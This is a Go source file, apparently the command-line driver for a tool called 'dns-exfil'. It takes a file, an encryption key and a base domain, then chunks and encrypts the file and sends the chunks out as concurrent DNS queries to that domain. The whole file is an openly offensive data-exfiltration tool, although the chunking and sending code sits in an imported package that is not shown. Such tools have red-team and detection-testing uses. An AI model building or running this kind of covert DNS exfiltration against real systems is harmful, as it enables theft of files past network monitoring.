package main

import (
	"flag"
	"fmt"
	"log"
	"os"
	"time"

	"github.com/rcoop/dns-exfil/client"
)

func main() {
	filePath := flag.String("f", "", "File to exfiltrate (required)")
	encKey := flag.String("encryption-key", "", "Encryption passphrase (required)")
	domain := flag.String("domain", "", "Base domain for DNS queries (required)")
	resolver := flag.String("resolver", "127.0.0.1:53", "DNS resolver address (ip:port)")
	concurrency := flag.Int("concurrency", 10, "Number of concurrent workers")
	timeout := flag.Duration("timeout", 2*time.Second, "Per-query timeout")
	retries := flag.Int("retry", 3, "Maximum retries per query")
	flag.Parse()

	if *filePath == "" || *encKey == "" || *domain == "" {
		fmt.Fprintln(os.Stderr, "Usage: exfil -f <file> --encryption-key <key> --domain <domain>")
		flag.PrintDefaults()
		os.Exit(1)
	}

	log.Printf("Chunking file: %s", *filePath)
	cf, err := client.ChunkFile(*filePath, *encKey, *domain)
	if err != nil {
		log.Fatalf("Failed to chunk file: %v", err)
	}
	log.Printf("File chunked: %d chunks of %d bytes", len(cf.Chunks), cf.ChunkSize)

	sender := client.NewSender(client.SenderConfig{
		Resolver:    *resolver,
		BaseDomain:  *domain,
		Concurrency: *concurrency,
		Timeout:     *timeout,
		MaxRetries:  *retries,
	})

	if err := sender.Send(cf); err != nil {
		log.Fatalf("Transfer failed: %v", err)
	}
}
